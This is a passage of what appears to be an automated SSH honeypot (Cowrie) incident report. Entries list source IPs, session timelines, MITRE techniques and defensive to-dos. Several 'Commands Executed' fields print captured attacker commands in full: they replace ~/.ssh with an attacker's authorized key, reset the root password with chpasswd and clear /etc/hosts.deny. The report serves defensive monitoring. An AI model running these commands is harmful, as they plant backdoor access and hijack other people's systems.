| `2026-04-22 06:20:04` | `cowrie.session.connect` |
| `2026-04-22 06:20:04` | `cowrie.client.version` |
| `2026-04-22 06:20:04` | `cowrie.client.kex` |
| `2026-04-22 06:20:05` | `cowrie.login.success` |
| `2026-04-22 06:20:05` | `cowrie.session.params` |
| `2026-04-22 06:20:05` | `cowrie.command.input` |
| `2026-04-22 06:20:05` | `cowrie.command.failed` |
| `2026-04-22 06:20:05` | `cowrie.log.closed` |
| `2026-04-22 06:20:06` | `cowrie.session.params` |
| `2026-04-22 06:20:06` | `cowrie.command.input` |
| `2026-04-22 06:20:06` | `cowrie.session.file_download` |
| `2026-04-22 06:20:06` | `cowrie.log.closed` |
| `2026-04-22 06:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8f58ed99ea

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:20 |
| **Last Seen** | 2026-04-22 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:20:08` | `cowrie.session.connect` |
| `2026-04-22 06:20:08` | `cowrie.client.version` |
| `2026-04-22 06:20:08` | `cowrie.client.kex` |
| `2026-04-22 06:20:09` | `cowrie.login.success` |
| `2026-04-22 06:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d059f45cec

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:21 |
| **Last Seen** | 2026-04-22 06:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:21:44` | `cowrie.session.connect` |
| `2026-04-22 06:21:44` | `cowrie.client.version` |
| `2026-04-22 06:21:44` | `cowrie.client.kex` |
| `2026-04-22 06:21:45` | `cowrie.login.success` |
| `2026-04-22 06:21:45` | `cowrie.session.params` |
| `2026-04-22 06:21:45` | `cowrie.command.input` |
| `2026-04-22 06:21:45` | `cowrie.command.failed` |
| `2026-04-22 06:21:46` | `cowrie.log.closed` |
| `2026-04-22 06:21:46` | `cowrie.session.params` |
| `2026-04-22 06:21:46` | `cowrie.command.input` |
| `2026-04-22 06:21:46` | `cowrie.session.file_download` |
| `2026-04-22 06:21:46` | `cowrie.log.closed` |
| `2026-04-22 06:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a91afc4c52c

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:21 |
| **Last Seen** | 2026-04-22 06:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:21:48` | `cowrie.session.connect` |
| `2026-04-22 06:21:48` | `cowrie.client.version` |
| `2026-04-22 06:21:49` | `cowrie.client.kex` |
| `2026-04-22 06:21:49` | `cowrie.login.success` |
| `2026-04-22 06:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ded46fd1eef1

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:23 |
| **Last Seen** | 2026-04-22 06:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:23:29` | `cowrie.session.connect` |
| `2026-04-22 06:23:29` | `cowrie.client.version` |
| `2026-04-22 06:23:29` | `cowrie.client.kex` |
| `2026-04-22 06:23:30` | `cowrie.login.success` |
| `2026-04-22 06:23:30` | `cowrie.session.params` |
| `2026-04-22 06:23:30` | `cowrie.command.input` |
| `2026-04-22 06:23:30` | `cowrie.command.failed` |
| `2026-04-22 06:23:30` | `cowrie.log.closed` |
| `2026-04-22 06:23:31` | `cowrie.session.params` |
| `2026-04-22 06:23:31` | `cowrie.command.input` |
| `2026-04-22 06:23:31` | `cowrie.session.file_download` |
| `2026-04-22 06:23:31` | `cowrie.log.closed` |
| `2026-04-22 06:23:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3153997dcc9

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:23 |
| **Last Seen** | 2026-04-22 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:23:33` | `cowrie.session.connect` |
| `2026-04-22 06:23:33` | `cowrie.client.version` |
| `2026-04-22 06:23:34` | `cowrie.client.kex` |
| `2026-04-22 06:23:34` | `cowrie.login.success` |
| `2026-04-22 06:23:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7419eb88a0a0

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:26 |
| **Last Seen** | 2026-04-22 06:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:26:02` | `cowrie.session.connect` |
| `2026-04-22 06:26:02` | `cowrie.client.version` |
| `2026-04-22 06:26:03` | `cowrie.client.kex` |
| `2026-04-22 06:26:03` | `cowrie.login.success` |
| `2026-04-22 06:26:04` | `cowrie.session.params` |
| `2026-04-22 06:26:04` | `cowrie.command.input` |
| `2026-04-22 06:26:04` | `cowrie.command.failed` |
| `2026-04-22 06:26:04` | `cowrie.log.closed` |
| `2026-04-22 06:26:04` | `cowrie.session.params` |
| `2026-04-22 06:26:04` | `cowrie.command.input` |
| `2026-04-22 06:26:04` | `cowrie.session.file_download` |
| `2026-04-22 06:26:04` | `cowrie.log.closed` |
| `2026-04-22 06:26:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-982549460599

| Field | Detail |
|---|---|
| **Source IP** | `92.30.241[.]93` |
| **First Seen** | 2026-04-22 06:26 |
| **Last Seen** | 2026-04-22 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:26:07` | `cowrie.session.connect` |
| `2026-04-22 06:26:07` | `cowrie.client.version` |
| `2026-04-22 06:26:07` | `cowrie.client.kex` |
| `2026-04-22 06:26:07` | `cowrie.login.success` |
| `2026-04-22 06:26:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.30.241[.]93` to AbuseIPDB if not already reported
- [ ] Block `92.30.241[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5cb68bb55f9

| Field | Detail |
|---|---|
| **Source IP** | `101.126.135[.]154` |
| **First Seen** | 2026-04-22 06:38 |
| **Last Seen** | 2026-04-22 06:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:38:16` | `cowrie.session.connect` |
| `2026-04-22 06:38:16` | `cowrie.client.version` |
| `2026-04-22 06:38:16` | `cowrie.client.kex` |
| `2026-04-22 06:38:17` | `cowrie.login.success` |
| `2026-04-22 06:38:17` | `cowrie.session.params` |
| `2026-04-22 06:38:17` | `cowrie.command.input` |
| `2026-04-22 06:38:17` | `cowrie.command.failed` |
| `2026-04-22 06:38:17` | `cowrie.log.closed` |
| `2026-04-22 06:38:18` | `cowrie.session.params` |
| `2026-04-22 06:38:18` | `cowrie.command.input` |
| `2026-04-22 06:38:18` | `cowrie.session.file_download` |
| `2026-04-22 06:38:18` | `cowrie.log.closed` |
| `2026-04-22 06:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.135[.]154` to AbuseIPDB if not already reported
- [ ] Block `101.126.135[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aef0f2579b09

| Field | Detail |
|---|---|
| **Source IP** | `101.126.135[.]154` |
| **First Seen** | 2026-04-22 06:38 |
| **Last Seen** | 2026-04-22 06:43 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:38:20` | `cowrie.session.connect` |
| `2026-04-22 06:38:20` | `cowrie.client.version` |
| `2026-04-22 06:38:20` | `cowrie.client.kex` |
| `2026-04-22 06:38:22` | `cowrie.login.success` |
| `2026-04-22 06:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.135[.]154` to AbuseIPDB if not already reported
- [ ] Block `101.126.135[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a40d1434711

| Field | Detail |
|---|---|
| **Source IP** | `101.126.135[.]154` |
| **First Seen** | 2026-04-22 06:39 |
| **Last Seen** | 2026-04-22 06:39 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ja7ePHLB27ML"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:39:17` | `cowrie.session.connect` |
| `2026-04-22 06:39:17` | `cowrie.client.version` |
| `2026-04-22 06:39:17` | `cowrie.client.kex` |
| `2026-04-22 06:39:18` | `cowrie.login.success` |
| `2026-04-22 06:39:18` | `cowrie.session.params` |
| `2026-04-22 06:39:18` | `cowrie.command.input` |
| `2026-04-22 06:39:18` | `cowrie.command.failed` |
| `2026-04-22 06:39:18` | `cowrie.log.closed` |
| `2026-04-22 06:39:19` | `cowrie.session.params` |
| `2026-04-22 06:39:19` | `cowrie.command.input` |
| `2026-04-22 06:39:19` | `cowrie.session.file_download` |
| `2026-04-22 06:39:19` | `cowrie.log.closed` |
| `2026-04-22 06:39:27` | `cowrie.session.params` |
| `2026-04-22 06:39:27` | `cowrie.command.input` |
| `2026-04-22 06:39:27` | `cowrie.log.closed` |
| `2026-04-22 06:39:28` | `cowrie.session.params` |
| `2026-04-22 06:39:28` | `cowrie.command.input` |
| `2026-04-22 06:39:28` | `cowrie.log.closed` |
| `2026-04-22 06:39:28` | `cowrie.session.params` |
| `2026-04-22 06:39:28` | `cowrie.command.input` |
| `2026-04-22 06:39:28` | `cowrie.session.file_download` |
| `2026-04-22 06:39:28` | `cowrie.log.closed` |
| `2026-04-22 06:39:29` | `cowrie.session.params` |
| `2026-04-22 06:39:29` | `cowrie.command.input` |
| `2026-04-22 06:39:29` | `cowrie.log.closed` |
| `2026-04-22 06:39:29` | `cowrie.session.params` |
| `2026-04-22 06:39:29` | `cowrie.command.input` |
| `2026-04-22 06:39:29` | `cowrie.log.closed` |
| `2026-04-22 06:39:30` | `cowrie.session.params` |
| `2026-04-22 06:39:30` | `cowrie.command.input` |
| `2026-04-22 06:39:30` | `cowrie.command.input` |
| `2026-04-22 06:39:30` | `cowrie.log.closed` |
| `2026-04-22 06:39:30` | `cowrie.session.params` |
| `2026-04-22 06:39:30` | `cowrie.command.input` |
| `2026-04-22 06:39:30` | `cowrie.log.closed` |
| `2026-04-22 06:39:31` | `cowrie.session.params` |
| `2026-04-22 06:39:31` | `cowrie.command.input` |
| `2026-04-22 06:39:31` | `cowrie.log.closed` |
| `2026-04-22 06:39:31` | `cowrie.session.params` |
| `2026-04-22 06:39:31` | `cowrie.command.input` |
| `2026-04-22 06:39:31` | `cowrie.log.closed` |
| `2026-04-22 06:39:32` | `cowrie.session.params` |
| `2026-04-22 06:39:32` | `cowrie.command.input` |
| `2026-04-22 06:39:32` | `cowrie.log.closed` |
| `2026-04-22 06:39:32` | `cowrie.session.params` |
| `2026-04-22 06:39:32` | `cowrie.command.input` |
| `2026-04-22 06:39:32` | `cowrie.log.closed` |
| `2026-04-22 06:39:33` | `cowrie.session.params` |
| `2026-04-22 06:39:33` | `cowrie.command.input` |
| `2026-04-22 06:39:33` | `cowrie.log.closed` |
| `2026-04-22 06:39:33` | `cowrie.session.params` |
| `2026-04-22 06:39:33` | `cowrie.command.input` |
| `2026-04-22 06:39:33` | `cowrie.log.closed` |
| `2026-04-22 06:39:34` | `cowrie.session.params` |
| `2026-04-22 06:39:34` | `cowrie.command.input` |
| `2026-04-22 06:39:34` | `cowrie.log.closed` |
| `2026-04-22 06:39:34` | `cowrie.session.params` |
| `2026-04-22 06:39:34` | `cowrie.command.input` |
| `2026-04-22 06:39:34` | `cowrie.log.closed` |
| `2026-04-22 06:39:35` | `cowrie.session.params` |
| `2026-04-22 06:39:35` | `cowrie.command.input` |
| `2026-04-22 06:39:35` | `cowrie.log.closed` |
| `2026-04-22 06:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.135[.]154` to AbuseIPDB if not already reported
- [ ] Block `101.126.135[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86a861ddb3b8

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 06:47 |
| **Last Seen** | 2026-04-22 06:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:47:48` | `cowrie.session.connect` |
| `2026-04-22 06:47:48` | `cowrie.client.version` |
| `2026-04-22 06:47:49` | `cowrie.client.kex` |
| `2026-04-22 06:47:50` | `cowrie.login.success` |
| `2026-04-22 06:47:51` | `cowrie.session.params` |
| `2026-04-22 06:47:51` | `cowrie.command.input` |
| `2026-04-22 06:47:51` | `cowrie.command.failed` |
| `2026-04-22 06:47:51` | `cowrie.log.closed` |
| `2026-04-22 06:47:52` | `cowrie.session.params` |
| `2026-04-22 06:47:52` | `cowrie.command.input` |
| `2026-04-22 06:47:52` | `cowrie.session.file_download` |
| `2026-04-22 06:47:52` | `cowrie.log.closed` |
| `2026-04-22 06:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78e7d7cce5d4

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 06:47 |
| **Last Seen** | 2026-04-22 06:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:47:56` | `cowrie.session.connect` |
| `2026-04-22 06:47:56` | `cowrie.client.version` |
| `2026-04-22 06:47:57` | `cowrie.client.kex` |
| `2026-04-22 06:47:59` | `cowrie.login.success` |
| `2026-04-22 06:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcc4bb38f9da

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 06:52 |
| **Last Seen** | 2026-04-22 06:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:52:11` | `cowrie.session.connect` |
| `2026-04-22 06:52:11` | `cowrie.client.version` |
| `2026-04-22 06:52:11` | `cowrie.client.kex` |
| `2026-04-22 06:52:13` | `cowrie.login.success` |
| `2026-04-22 06:52:14` | `cowrie.session.params` |
| `2026-04-22 06:52:14` | `cowrie.command.input` |
| `2026-04-22 06:52:14` | `cowrie.command.failed` |
| `2026-04-22 06:52:14` | `cowrie.log.closed` |
| `2026-04-22 06:52:15` | `cowrie.session.params` |
| `2026-04-22 06:52:15` | `cowrie.command.input` |
| `2026-04-22 06:52:15` | `cowrie.session.file_download` |
| `2026-04-22 06:52:15` | `cowrie.log.closed` |
| `2026-04-22 06:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0505ee7d8a34

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 06:52 |
| **Last Seen** | 2026-04-22 06:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 06:52:19` | `cowrie.session.connect` |
| `2026-04-22 06:52:19` | `cowrie.client.version` |
| `2026-04-22 06:52:19` | `cowrie.client.kex` |
| `2026-04-22 06:52:21` | `cowrie.login.success` |
| `2026-04-22 06:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc3b85988ce

| Field | Detail |
|---|---|
| **Source IP** | `179.62.216[.]38` |
| **First Seen** | 2026-04-22 07:09 |
| **Last Seen** | 2026-04-22 07:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
